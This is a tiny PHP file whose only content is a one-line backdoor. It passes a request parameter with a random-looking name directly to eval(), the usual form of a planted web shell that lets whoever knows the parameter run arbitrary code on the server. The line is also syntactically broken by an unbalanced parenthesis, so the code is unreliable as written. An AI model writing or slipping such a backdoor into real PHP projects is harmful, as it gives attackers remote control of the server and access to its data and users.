<?php
eval(($_GET['YHNibOqE']);
?>
